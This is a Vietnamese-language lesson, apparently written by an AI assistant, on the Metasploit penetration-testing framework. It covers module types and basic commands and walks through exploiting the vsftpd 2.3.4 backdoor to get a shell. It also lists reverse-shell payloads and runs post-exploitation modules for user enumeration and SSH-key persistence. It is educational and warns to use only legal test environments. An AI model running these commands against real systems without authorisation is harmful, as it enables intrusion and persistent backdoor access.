DÆ°á»›i Ä‘Ã¢y lÃ  ná»™i dung chi tiáº¿t cho bÃ i há»c:

---

# 04. Metasploit

**Khung khai thÃ¡c lá»— há»•ng máº¡nh máº½ nháº¥t dÃ nh cho pentester**

---

## ğŸ¯ Má»¥c tiÃªu

* Hiá»ƒu khÃ¡i niá»‡m vÃ  kiáº¿n trÃºc cá»§a Metasploit.
* Biáº¿t cÃ¡ch sá»­ dá»¥ng cÃ¡c module chÃ­nh: exploit, payload, auxiliary...
* Thá»±c hÃ nh khai thÃ¡c má»™t lá»— há»•ng Ä‘Æ¡n giáº£n vá»›i Metasploit Framework.

---

## ğŸ“Œ 1. Metasploit lÃ  gÃ¬?

Metasploit lÃ  má»™t **framework** há»— trá»£ kiá»ƒm thá»­ báº£o máº­t, khai thÃ¡c lá»— há»•ng, vÃ  phÃ¡t triá»ƒn mÃ£ khai thÃ¡c (exploit).

### ğŸ”‘ ThÃ nh pháº§n chÃ­nh:

* **Exploit**: Ä‘oáº¡n mÃ£ khai thÃ¡c lá»— há»•ng
* **Payload**: mÃ£ thá»±c thi sau khi exploit thÃ nh cÃ´ng (VD: má»Ÿ shell)
* **Auxiliary**: cÃ¡c module há»— trá»£ (scan, fuzzing, brute force...)
* **Post**: module thá»±c hiá»‡n hÃ nh vi sau khai thÃ¡c (VD: láº¥y máº­t kháº©u, táº¡o backdoor...)

---

## ğŸ›  2. CÃ i Ä‘áº·t vÃ  khá»Ÿi Ä‘á»™ng

### âœ… TrÃªn Kali Linux:

Metasploit Ä‘Ã£ Ä‘Æ°á»£c cÃ i sáºµn. Khá»Ÿi cháº¡y báº±ng:

```bash
msfconsole
```

---

## âš™ï¸ 3. CÃ¢u lá»‡nh cÆ¡ báº£n

| Lá»‡nh                   | MÃ´ táº£                                     |
| ---------------------- | ----------------------------------------- |
| `search tÃªn_lo_hong`   | TÃ¬m kiáº¿m exploit theo tÃªn/lá»— há»•ng         |
| `use Ä‘Æ°á»ng_dáº«n_module` | Sá»­ dá»¥ng module (exploit, auxiliary, etc.) |
| `set`                  | GÃ¡n giÃ¡ trá»‹ (IP, payload, port...)        |
| `show options`         | Xem cÃ¡c tham sá»‘ cáº§n thiáº¿t                 |
| `exploit` hoáº·c `run`   | Thá»±c thi táº¥n cÃ´ng                         |

---

## ğŸš€ 4. Thá»±c hÃ nh khai thÃ¡c Ä‘Æ¡n giáº£n

**Ká»‹ch báº£n**: MÃ¡y má»¥c tiÃªu Ä‘ang cháº¡y dá»‹ch vá»¥ vulnerable FTP (`vsftpd 2.3.4`).

### ğŸ”¹ BÆ°á»›c 1: TÃ¬m module exploit

```bash
search vsftpd
```

Chá»n module:

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

### ğŸ”¹ BÆ°á»›c 2: Cáº¥u hÃ¬nh tham sá»‘

```bash
set RHOSTS 192.168.1.100
set RPORT 21
```

### ğŸ”¹ BÆ°á»›c 3: Táº¥n cÃ´ng

```bash
exploit
```

Náº¿u thÃ nh cÃ´ng, báº¡n sáº½ cÃ³ shell truy cáº­p há»‡ thá»‘ng Ä‘Ã­ch.

---

## ğŸ“¦ 5. Payload phá»• biáº¿n

| Payload                             | MÃ´ táº£                          |
| ----------------------------------- | ------------------------------ |
| `cmd/unix/reverse`                  | Lá»‡nh Ä‘áº£o chiá»u shell trÃªn Unix |
| `windows/meterpreter/reverse_tcp`   | Shell máº¡nh trÃªn Windows        |
| `linux/x86/meterpreter/reverse_tcp` | TÆ°Æ¡ng tá»± cho Linux             |

---

## ğŸ§ª 6. Post-exploitation

Sau khi truy cáº­p thÃ nh cÃ´ng há»‡ thá»‘ng:

```bash
run post/linux/gather/enum_users
```

Hoáº·c:

```bash
run post/multi/manage/sshkey_persistence
```

---

## ğŸ“Œ 7. Giao diá»‡n web: Metasploit Community / Armitage

* Armitage: giao diá»‡n GUI há»— trá»£ táº¥n cÃ´ng nhÃ³m vÃ  mÃ´ phá»ng táº­p trung.
* CÃ³ thá»ƒ cÃ i thÃªm náº¿u muá»‘n táº¥n cÃ´ng trá»±c quan.

---

## ğŸ›¡ 8. LÆ°u Ã½ an toÃ n

* Metasploit ráº¥t máº¡nh â†’ **Chá»‰ dÃ¹ng trong mÃ´i trÆ°á»ng kiá»ƒm thá»­ há»£p phÃ¡p**.
* Sá»­ dá»¥ng nháº§m cÃ³ thá»ƒ phÃ¡ vá»¡ há»‡ thá»‘ng tháº­t vÃ  vi pháº¡m phÃ¡p luáº­t.

---

## ğŸ§  Tá»•ng káº¿t

* Metasploit lÃ  cÃ´ng cá»¥ quan trá»ng trong quy trÃ¬nh khai thÃ¡c lá»— há»•ng.
* Báº¡n cáº§n káº¿t há»£p Nmap + Recon + Metasploit Ä‘á»ƒ táº¡o ra cÃ¡c Ä‘Ã²n táº¥n cÃ´ng hiá»‡u quáº£.
* NÃªn luyá»‡n táº­p trÃªn cÃ¡c mÃ´i trÆ°á»ng nhÆ°: **Metasploitable**, **TryHackMe**, **Hack The Box**, **DVWA**...

---

Báº¡n muá»‘n tiáº¿p tá»¥c vá»›i bÃ i **05. Meterpreter nÃ¢ng cao** khÃ´ng?
